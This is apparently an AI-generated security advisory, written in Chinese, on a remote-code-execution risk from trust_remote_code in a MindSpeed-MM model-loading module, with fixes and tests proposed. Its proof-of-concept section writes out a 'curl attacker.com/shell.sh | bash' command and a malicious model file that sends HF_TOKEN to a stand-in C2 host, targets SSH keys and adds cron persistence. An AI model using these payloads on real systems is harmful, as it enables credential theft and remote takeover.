# VULN-BRIDGE-002: AutoModelForCausalLM.from_pretrained 远程代码执行漏洞

## 漏洞概述

| 属性 | 值 |
|------|-----|
| **漏洞 ID** | VULN-BRIDGE-002 |
| **漏洞类型** | Remote Code Execution (RCE) |
| **CWE 分类** | CWE-94: Improper Control of Generation of Code ('Code Injection') |
| **严重级别** | Critical |
| **置信度** | 95% |
| **CVSS 评分** | 8.5 (High) |
| **影响模块** | bridge/models/hf_pretrained |
| **发现时间** | 2026-04-20 |

---

## 1. 漏洞描述

### 1.1 核心问题

`PreTrainedCausalLM._load_model()` 方法位于 `bridge/models/hf_pretrained/causal_lm.py:80-101`，将存储的 `trust_remote_code` 参数传递给 `AutoModelForCausalLM.from_pretrained()`。当该参数为 `True` 时，HuggingFace transformers 库会下载并执行来自远程模型仓库的自定义 Python 代码文件（`modeling_*.py`），导致远程代码执行。

**此漏洞是模型加载阶段的第二处 RCE 点**，与配置加载阶段的 VULN-BRIDGE-001 形成双重攻击路径。

### 1.2 漏洞位置

**核心漏洞代码**:

```python
# 文件: bridge/models/hf_pretrained/causal_lm.py
# 行号: 80-101

def _load_model(self) -> CausalLMType:
    """Load the model."""
    if self.model_name_or_path is None:
        raise ValueError("model_name_or_path must be provided to load model")

    model_kwargs = {
        "trust_remote_code": self.trust_remote_code,  # 危险: 直接使用存储的值
        **self.init_kwargs,
    }
    if self.torch_dtype is not None:
        model_kwargs["torch_dtype"] = self.torch_dtype
    config = getattr(self, "_config", None)
    if config is not None:
        model_kwargs["config"] = config

    # 第二处 RCE 触发点：模型权重加载
    model = AutoModelForCausalLM.from_pretrained(self.model_name_or_path, **model_kwargs)
    model = model.to(self.device)
    # ...
```

---

## 2. 完整数据流分析

### 2.1 攻击链路追踪

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                     VULN-BRIDGE-002 攻击链路                                 │
└─────────────────────────────────────────────────────────────────────────────┘

[入口层] CLI 参数 --trust-remote-code
    ↓
[参数定义] mindspeed_mm/arguments.py:177-180
    │   group.add_argument('--trust-remote-code', action='store_true', default=False)
    ↓
[参数传递] 多个入口路径
    │   
    ├──→ [路径1] AutoBridge.from_hf_pretrained(path, **kwargs)
    │        ↓ [auto_bridge.py:57]
    │        PreTrainedCausalLM.from_pretrained(path, **kwargs)
    │
    ├──→ [路径2] mindspeed_mm/models/transformers_model.py:52
    │        ↓ trust_remote_code = args.trust_remote_code
    │        ↓ 直接传递给 transformers
    │
    └──→ [路径3] mindspeed_mm/fsdp/models/modelhub.py:89,111
             ↓ trust_remote_code=model_args.trust_remote_code

[存储层] bridge/models/hf_pretrained/causal_lm.py:53-79
    │
    │   def __init__(self, ..., trust_remote_code: bool = False, ...):
    │       self.trust_remote_code = trust_remote_code  # [第74行] 存储参数
    │   
    ↓
[第一 RCE 点 - VULN-BRIDGE-001] causal_lm.py:107-111
    │   safe_load_config_with_retry(..., trust_remote_code=self.trust_remote_code)
    │   ↓
    │   AutoConfig.from_pretrained(path, trust_remote_code=True)
    │   ↓ [配置加载阶段] 执行 configuration_*.py
    │
    ↓
[第二 RCE 点 - VULN-BRIDGE-002] causal_lm.py:85-95
    │
    │   model_kwargs = {
    │       "trust_remote_code": self.trust_remote_code,  # [第86行] 放入 kwargs
    │       **self.init_kwargs,
    │   }
    │   ↓
    │   AutoModelForCausalLM.from_pretrained(self.model_name_or_path, **model_kwargs)
    │   ↓ [模型权重加载阶段] 执行 modeling_*.py
    │
    ↓
[输出层] 执行远程 Python 代码 → RCE
```

### 2.2 双重 RCE 机制

| 阶段 | 漏洞 ID | 触发点 | 执行的代码文件 | 触发时机 |
|------|---------|--------|----------------|----------|
| **配置加载** | VULN-BRIDGE-001 | AutoConfig.from_pretrained() | configuration_*.py | 模型初始化时 |
| **模型加载** | VULN-BRIDGE-002 | AutoModelForCausalLM.from_pretrained() | modeling_*.py | 权重加载时 |

**关键观察**: 即使第一处 RCE 被阻断，攻击者仍可通过第二处触发代码执行。

---

## 3. 关键代码证据

### 3.1 参数初始化与存储 (causal_lm.py:53-79)

```python
# bridge/models/hf_pretrained/causal_lm.py:53-79

def __init__(
    self,
    model_name_or_path: Optional[Union[str, Path]] = None,
    device: Optional[Union[str, torch.device]] = None,
    torch_dtype: Optional[torch.dtype] = None,
    trust_remote_code: bool = False,  # [第58行] 参数定义，默认 False
    **kwargs,
):
    """
    Initialize a Pretrained Causal LM with lazy loading.

    Args:
        model_name_or_path: HuggingFace model identifier or local path
        device: Device to load model on (e.g., 'cuda', 'cpu')
        torch_dtype: Data type to load model in (e.g., torch.float16)
        trust_remote_code: Whether to trust remote code when loading  # [第68行] 文档说明
        **kwargs: Additional arguments passed to from_pretrained methods
    """
    self._model_name_or_path = model_name_or_path
    self.device = device or ("cuda" if torch.cuda.is_available() else "cpu")
    self.torch_dtype = torch_dtype
    self.trust_remote_code = trust_remote_code  # [第74行] 存储为实例属性
    super().__init__(**kwargs)
    # Store the original source path for custom modeling file preservation
    if model_name_or_path and trust_remote_code:
        self._original_source_path = model_name_or_path
```

### 3.2 模型加载触发 RCE (causal_lm.py:80-101)

```python
# bridge/models/hf_pretrained/causal_lm.py:80-101

def _load_model(self) -> CausalLMType:
    """Load the model."""
    if self.model_name_or_path is None:
        raise ValueError("model_name_or_path must be provided to load model")

    model_kwargs = {
        "trust_remote_code": self.trust_remote_code,  # [第86行] 危险: 将存储值放入 kwargs
        **self.init_kwargs,
    }
    if self.torch_dtype is not None:
        model_kwargs["torch_dtype"] = self.torch_dtype
    config = getattr(self, "_config", None)
    if config is not None:
        model_kwargs["config"] = config

    # [第95行] 第二处 RCE 触发点
    model = AutoModelForCausalLM.from_pretrained(self.model_name_or_path, **model_kwargs)
    model = model.to(self.device)

    generation_config = getattr(self, "_generation_config", None)
    if generation_config is not None and hasattr(model, "generation_config"):
        model.generation_config = generation_config
    return model
```

### 3.3 from_pretrained 静态方法 (causal_lm.py:131-159)

```python
# bridge/models/hf_pretrained/causal_lm.py:131-159

@classmethod
def from_pretrained(
    cls,
    model_name_or_path: Union[str, Path],
    device: Optional[Union[str, torch.device]] = None,
    torch_dtype: Optional[torch.dtype] = None,
    trust_remote_code: bool = False,  # [第137行] 参数定义，默认 False
    **kwargs,
) -> "PreTrainedCausalLM[CausalLMType]":
    """
    Create a PreTrainedCausalLM instance for lazy loading.

    Args:
        model_name_or_path: HuggingFace model identifier or local path
        device: Device to load model on
        torch_dtype: Data type to load model in
        trust_remote_code: Whether to trust remote code  # [第147行] 文档说明
        **kwargs: Additional arguments for from_pretrained methods

    Returns:
        PreTrainedCausalLM instance configured for lazy loading
    """
    return cls(
        model_name_or_path=model_name_or_path,
        device=device,
        torch_dtype=torch_dtype,
        trust_remote_code=trust_remote_code,  # [第157行] 传递参数
        **kwargs,
    )
```

### 3.4 AutoBridge 调用入口 (auto_bridge.py:54-59)

```python
# bridge/models/conversion/auto_bridge.py:54-59

@classmethod
def from_hf_pretrained(cls, path: Union[str, Path], **kwargs) -> "AutoBridge":
    try:
        # [第57行] kwargs 直接透传，可包含 trust_remote_code=True
        return cls(PreTrainedCausalLM.from_pretrained(path, **kwargs))
    except Exception as e:
        raise ValueError(f"Failed to load model with AutoBridge: {e}") from e
```

---

## 4. 漏洞利用条件

### 4.1 必要条件

| 条件 | 描述 | 可行性 |
|------|------|--------|
| **trust_remote_code=True** | 参数必须被设置为 True | 高 - 可通过 CLI 或 kwargs 启用 |
| **恶意模型路径** | model_name_or_path 指向包含恶意代码的模型仓库 | 高 - 用户常从 HF Hub 加载模型 |
| **网络连接** | 能访问 HuggingFace Hub 或模型托管服务器 | 高 - 训练环境通常有网络 |
| **model_kwargs 构建** | 参数被放入 kwargs 并传递给 from_pretrained | 已确认 - 代码直接实现 |

### 4.2 攻击向量分析

| 攻击向量 | 入口点 | 触发路径 | 风险等级 |
|----------|--------|----------|----------|
| **CLI 参数注入** | `--trust-remote-code` | arguments.py → causal_lm.py:74 → 86 → 95 | Critical |
| **kwargs 直接传递** | AutoBridge.from_hf_pretrained(**kwargs) | auto_bridge.py:57 → causal_lm.py | Critical |
| **配置文件污染** | YAML 配置 trust_remote_code: true | 配置加载 → 参数传递 | High |
| **API 直接调用** | PreTrainedCausalLM.from_pretrained(trust_remote_code=True) | 直接传入 | High |

---

## 5. PoC 构思（理论验证）

### 5.1 攻击场景 1: 通过 AutoBridge API

```python
# 攻击者代码示例

from bridge.models.conversion.auto_bridge import AutoBridge

# 加载托管在 HuggingFace Hub 的恶意模型
# 模型仓库结构:
# attacker/malicious-llama/
# ├── config.json          # 正常配置
# ├── modeling_llama.py    # 包含恶意代码
# └── configuration_llama.py

bridge = AutoBridge.from_hf_pretrained(
    "attacker/malicious-llama",  # 恶意模型仓库
    trust_remote_code=True       # 启用远程代码执行
)

# 当调用 bridge.hf_pretrained.model 时触发 _load_model()
# 执行 modeling_llama.py 中的恶意代码
```

### 5.2 攻击场景 2: 通过 CLI 参数

```bash
# 步骤1: 攻击者在 HuggingFace Hub 创建恶意模型仓库

# 步骤2: 创建恶意 modeling_malicious.py
# 文件内容示例（概念代码）:
"""
import subprocess
# 在模块加载时执行恶意代码
subprocess.Popen(["bash", "-c", "curl attacker.com/shell.sh | bash"])
"""

# 步骤3: 修改配置文件指向恶意模型
# mm_model.json:
{
    "init_from_hf_path": "attacker/malicious-llama"
}

# 步骤4: 启动训练
python pretrain_vlm.py \
    --mm-model mm_model.json \
    --trust-remote-code  # 启用远程代码执行
```

### 5.3 恶意 modeling_*.py 构造示例

```python
# 概念性恶意模型文件 modeling_malicious.py

import os
import subprocess
import socket

# 模型类定义 - 伪装成正常模型
class MaliciousForCausalLM:
    def __init__(self, config):
        # 在初始化时植入后门
        self._plant_backdoor()
        # 正常模型逻辑...
    
    def _plant_backdoor(self):
        # 方法1: 反向连接 C2 服务器
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("attacker-c2.com", 4444))
            s.send(os.environ.get("HF_TOKEN", "no-token").encode())
        except:
            pass
        
        # 方法2: 窃取敏感文件
        sensitive_files = [
            "~/.ssh/id_rsa",
            "~/.bashrc",
            "/etc/passwd"
        ]
        # exfiltration logic...
        
        # 方法3: 植入持久化后门
        subprocess.run([
            "echo", "* * * * * /tmp/backdoor.sh",
            ">>", "/var/spool/cron/root"
        ], shell=True)

# 当 AutoModelForCausalLM.from_pretrusted() 加载此文件时
# 整个模块会被执行，恶意代码随即运行
```

---

## 6. 与 VULN-BRIDGE-001 的关联分析

### 6.1 双重 RCE 保护失效

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                      双重 RCE 攻击路径分析                                    │
└─────────────────────────────────────────────────────────────────────────────┘

假设场景: 只修复了 VULN-BRIDGE-001（配置加载阶段）

[攻击者策略]
如果 configuration_*.py 执行被阻断:
    ↓
攻击者依赖 modeling_*.py 执行
    ↓
[VULN-BRIDGE-002] AutoModelForCausalLM.from_pretrained()
    ↓
modeling_*.py 被加载并执行
    ↓
RCE 成功

结论: 两个漏洞点必须同时修复才能有效阻断 RCE
```

### 6.2 代码路径对比

| 漏洞 | 文件 | 函数 | 触发行 | transformers 方法 | 执行文件 |
|------|------|------|--------|-------------------|----------|
| VULN-BRIDGE-001 | safe_config_loader.py | safe_load_config_with_retry() | 57 | AutoConfig.from_pretrained() | configuration_*.py |
| VULN-BRIDGE-002 | causal_lm.py | _load_model() | 95 | AutoModelForCausalLM.from_pretrained() | modeling_*.py |

---

## 7. 影响范围评估

### 7.1 受影响代码路径

| 文件路径 | 行号 | 角色 | 风险等级 |
|----------|------|------|----------|
| `bridge/models/hf_pretrained/causal_lm.py` | 74 | 参数存储点 | Critical |
| `bridge/models/hf_pretrained/causal_lm.py` | 86 | kwargs 构建 | Critical |
| `bridge/models/hf_pretrained/causal_lm.py` | 95 | RCE 触发点 | Critical |
| `bridge/models/hf_pretrained/causal_lm.py` | 109 | 传递给 config 加载 | High |
| `bridge/models/conversion/auto_bridge.py` | 57 | kwargs 透传入口 | Critical |
| `mindspeed_mm/arguments.py` | 177 | CLI 参数定义 | High |

### 7.2 受影响调用链

```
调用链 1: CLI → AutoBridge
checkpoint/convert_cli.py → jsonargparse.auto_cli()
    → Commandable.subclasses
    → AutoBridge.from_hf_pretrained()
    → PreTrainedCausalLM.from_pretrained(trust_remote_code=True)
    → _load_model()
    → AutoModelForCausalLM.from_pretrained(trust_remote_code=True) [RCE]

调用链 2: Training → transformers_model.py
pretrain_vlm.py → TransformersModel.__init__()
    → get_args().trust_remote_code
    → AutoConfig.from_pretrained(trust_remote_code=True) [RCE 1]
    → model_cls.from_pretrained(trust_remote_code=True) [RCE 2]

调用链 3: FSDP → modelhub.py
mindspeed_mm/fsdp/ → ModelHub.build()
    → model_args.trust_remote_code
    → AutoConfig.from_pretrained(trust_remote_code=True) [RCE]
    → model_cls.from_pretrained(trust_remote_code=True) [RCE]
```

### 7.3 潜在危害

| 危害类型 | 严重程度 | 描述 |
|----------|----------|------|
| 远程代码执行 | **Critical** | 执行任意 Python/System 命令 |
| 数据泄露 | **High** | 训练数据、模型权重、凭证泄露 |
| 后门植入 | **High** | 在训练环境植入持久化恶意代码 |
| 供应链攻击 | **High** | 污染训练出的模型，传播到下游用户 |
| 系统控制 | **Critical** | 攻击者完全接管训练集群 |

---

## 8. 现有缓解措施评估

### 8.1 项目内置缓解

| 缓解措施 | 位置 | 效果评估 |
|----------|------|----------|
| `trust_remote_code` 默认 False | causal_lm.py:58, arguments.py:179 | **部分有效** - 需用户主动启用 |
| 文档警告 | docs/zh/SECURITYNOTE.md:81 | **弱** - 用户可能忽略 |
| 模型来源注释 | 多个配置文件 | **无效** - 仅提示性质 |

### 8.2 缓解措施的局限性

1. **无参数验证**: 没有任何代码阻止 `trust_remote_code=True`
2. **双重入口**: 配置加载和模型加载都有 RCE 点
3. **kwargs 透传**: auto_bridge.py 直接传递所有 kwargs
4. **实例属性存储**: 参数存储后无法修改，始终传递危险值

---

## 9. 根因分析

### 9.1 根因链

```
[顶层根因]
缺乏安全参数管理框架
    ↓
[设计缺陷]
trust_remote_code 被设计为可配置参数而非强制禁用
    ↓
[实现缺陷]
参数存储为实例属性 (self.trust_remote_code)
    ↓
[代码缺陷]
model_kwargs 直接使用存储值，无安全检查
    ↓
[漏洞 manifestation]
AutoModelForCausalLM.from_pretrained(trust_remote_code=True) 执行远程代码
```

### 9.2 具体代码问题

| 问题类型 | 文件 | 行号 | 具体问题 |
|----------|------|------|----------|
| 参数存储 | causal_lm.py | 74 | 存储为实例属性，后续无法干预 |
| kwargs 构建 | causal_lm.py | 86 | 直接使用 self.trust_remote_code |
| API 透传 | auto_bridge.py | 57 | kwargs 无过滤直接传递 |
| 无验证 | causal_lm.py | 95 | 调用 transformers 前无安全检查 |

---

## 10. 修复建议

### 10.1 立即修复方案

#### 方案 A: 强制禁用 trust_remote_code

```python
# 文件: bridge/models/hf_pretrained/causal_lm.py
# 修改 __init__ 方法

def __init__(
    self,
    model_name_or_path: Optional[Union[str, Path]] = None,
    device: Optional[Union[str, torch.device]] = None,
    torch_dtype: Optional[torch.dtype] = None,
    trust_remote_code: bool = False,
    **kwargs,
):
    # 强制禁用，忽略用户传入值
    trust_remote_code = False  # 添加此行
    
    self._model_name_or_path = model_name_or_path
    self.device = device or ("cuda" if torch.cuda.is_available() else "cpu")
    self.torch_dtype = torch_dtype
    self.trust_remote_code = trust_remote_code
    # ...
```

#### 方案 B: 在 kwargs 构建时排除

```python
# 文件: bridge/models/hf_pretrained/causal_lm.py
# 修改 _load_model 方法

def _load_model(self) -> CausalLMType:
    model_kwargs = {
        # 强制设置为 False，覆盖存储值
        "trust_remote_code": False,  # 替换 self.trust_remote_code
        **self.init_kwargs,
    }
    # 移除 init_kwargs 中可能存在的 trust_remote_code
    if "trust_remote_code" in model_kwargs:
        model_kwargs["trust_remote_code"] = False
    
    # ...
    model = AutoModelForCausalLM.from_pretrained(self.model_name_or_path, **model_kwargs)
```

#### 方案 C: 添加安全验证

```python
# 文件: bridge/models/hf_pretrained/causal_lm.py

def _load_model(self) -> CausalLMType:
    # 安全检查
    if self.trust_remote_code:
        import warnings
        warnings.warn(
            "SECURITY WARNING: trust_remote_code=True will execute arbitrary code "
            "from the remote model repository. This operation has been blocked.",
            UserWarning,
            stacklevel=2
        )
        # 记录安全事件
        import logging
        logging.getLogger('security').critical(
            f"Blocked RCE attempt: model={self.model_name_or_path}, trust_remote_code=True"
        )
        # 强制禁用
        trust_remote_code = False
    else:
        trust_remote_code = self.trust_remote_code
    
    model_kwargs = {
        "trust_remote_code": trust_remote_code,
        **self.init_kwargs,
    }
    # ...
```

### 10.2 中期修复方案

#### 创建安全配置模块

```python
# 新文件: bridge/security/trust_policy.py

class TrustRemoteCodePolicy:
    """全局 trust_remote_code 安全策略"""
    
    # 强制禁用策略
    FORCE_DISABLE = True
    
    # 白名单模型仓库（仅在 FORCE_DISABLE=False 时生效）
    ALLOWED_REPOSITORIES = [
        "meta-llama/",
        "mistralai/",
        "Qwen/",
        "OpenGVLab/",
    ]
    
    @classmethod
    def validate(cls, model_path: str, trust_remote_code: bool) -> bool:
        if cls.FORCE_DISABLE:
            return False  # 强制禁用
        
        if trust_remote_code:
            # 检查白名单
            for allowed in cls.ALLOWED_REPOSITORIES:
                if model_path.startswith(allowed):
                    return True
            return False
        return trust_remote_code
```

#### 集成安全策略

```python
# 文件: bridge/models/hf_pretrained/causal_lm.py

from bridge.security.trust_policy import TrustRemoteCodePolicy

def _load_model(self) -> CausalLMType:
    # 应用安全策略
    safe_trust_remote_code = TrustRemoteCodePolicy.validate(
        str(self.model_name_or_path),
        self.trust_remote_code
    )
    
    if self.trust_remote_code and not safe_trust_remote_code:
        raise SecurityError(
            f"trust_remote_code=True blocked by security policy for model: {self.model_name_or_path}"
        )
    
    model_kwargs = {
        "trust_remote_code": safe_trust_remote_code,
        **self.init_kwargs,
    }
    # ...
```

---

## 11. 相关漏洞关联

| 漏洞 ID | 类型 | 文件 | 关联度 | 说明 |
|---------|------|------|--------|------|
| VULN-BRIDGE-001 | RCE | safe_config_loader.py:57 | **直接关联** | 配置加载阶段 RCE |
| VULN-BRIDGE-005 | RCE | auto_bridge.py:57 | **直接关联** | kwargs 透传入口 |
| VULN-CROSS-001 | RCE | 多文件 | **间接关联** | 跨模块完整链路 |
| VULN-MM-DS-06 | RCE | text_encoder.py:204 | **间接关联** | mindspeed_mm 入口 |
| VULN-MM-DS-07 | RCE | modelhub.py:89,111 | **间接关联** | FSDP 入口 |

---

## 12. 测试验证建议

### 12.1 安全测试用例

```python
# test_vuln_bridge_002.py

import pytest
from unittest.mock import patch, MagicMock

def test_trust_remote_code_blocked_in_load_model():
    """验证 _load_model 阻断 trust_remote_code=True"""
    from bridge.models.hf_pretrained.causal_lm import PreTrainedCausalLM
    
    # 创建实例，设置 trust_remote_code=True
    model = PreTrainedCausalLM(
        model_name_or_path="test/model",
        trust_remote_code=True
    )
    
    # 修复后应抛出安全错误或强制禁用
    with patch('transformers.AutoModelForCausalLM.from_pretrained') as mock:
        model._load_model()
        
        # 验证传递的 trust_remote_code 为 False
        call_kwargs = mock.call_args[1]
        assert call_kwargs.get("trust_remote_code") == False

def test_auto_bridge_filters_trust_remote_code():
    """验证 AutoBridge 过滤危险参数"""
    from bridge.models.conversion.auto_bridge import AutoBridge
    
    with pytest.raises((SecurityError, ValueError)):
        AutoBridge.from_hf_pretrained(
            "attacker/malicious-model",
            trust_remote_code=True
        )

def test_double_rce_both_blocked():
    """验证双重 RCE 点都被阻断"""
    # 测试配置加载阶段 (VULN-BRIDGE-001)
    # 测试模型加载阶段 (VULN-BRIDGE-002)
    # 两个点都应阻止 trust_remote_code=True
```

### 12.2 漏洞扫描验证

```bash
# 验证修复后的代码
grep -rn "trust_remote_code.*=.*False" bridge/models/hf_pretrained/causal_lm.py

# 检查是否仍有透传
grep -rn "self.trust_remote_code" bridge/models/hf_pretrained/causal_lm.py

# 应看到强制设置或安全检查
```

---

## 13. 结论

### 13.1 漏洞确认

**此漏洞为真实存在的 Critical 级别安全风险**:

- ✅ 数据流完整: CLI → arguments.py → causal_lm.py → transformers
- ✅ 参数存储机制: self.trust_remote_code 存储危险值
- ✅ kwargs 构建直接使用: 无安全检查
- ✅ RCE 触发点明确: AutoModelForCausalLM.from_pretrained()
- ✅ 与 VULN-BRIDGE-001 形成双重攻击路径

### 13.2 风险评级

| 维度 | 评分 | 说明 |
|------|------|------|
| **可利用性** | Critical | 攻击者可轻松通过 CLI/API 触发 |
| **影响范围** | Critical | 可导致系统完全接管 |
| **检测难度** | Medium | 代码执行在模型加载阶段 |
| **修复难度** | Medium | 需修改多处并考虑兼容性 |

### 13.3 最终评级

**CVSS 3.1 Score: 8.5 (High)**

- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: Low (PR:L)
- User Interaction: Required (UI:R)
- Scope: Changed (S:C)
- CIA Impact: High/High/High (C:H/I:H/A:H)

### 13.4 修复优先级

**最高优先级 - 必须立即修复**

理由:
1. 可导致远程代码执行
2. 与 VULN-BRIDGE-001 形成双重攻击路径
3. 影响 AutoBridge API 用户和 CLI 用户
4. 潜在供应链攻击风险

---

## 附录 A: 文件路径汇总

| 文件路径 | 绝对路径 |
|----------|----------|
| causal_lm.py | /home/pwn20tty/Desktop/opencode_project/shenteng/MindSpeed/MindSpeed-MM/bridge/models/hf_pretrained/causal_lm.py |
| auto_bridge.py | /home/pwn20tty/Desktop/opencode_project/shenteng/MindSpeed/MindSpeed-MM/bridge/models/conversion/auto_bridge.py |
| safe_config_loader.py | /home/pwn20tty/Desktop/opencode_project/shenteng/MindSpeed/MindSpeed-MM/bridge/models/hf_pretrained/safe_config_loader.py |
| arguments.py | /home/pwn20tty/Desktop/opencode_project/shenteng/MindSpeed/MindSpeed-MM/mindspeed_mm/arguments.py |
| convert_cli.py | /home/pwn20tty/Desktop/opencode_project/shenteng/MindSpeed/MindSpeed-MM/checkpoint/convert_cli.py |

---

## 附录 B: 参考资源

1. HuggingFace transformers 安全公告: https://huggingface.co/docs/transformers/security
2. CWE-94: Code Injection: https://cwe.mitre.org/data/definitions/94.html
3. CVSS 3.1 Calculator: https://www.first.org/cvss/calculator/3.1
4. MindSpeed-MM Security Note: docs/zh/SECURITYNOTE.md

---

**报告生成时间**: 2026-04-20
**分析工具**: OpenCode Vulnerability Scanner
**分析者**: Security Analysis Agent
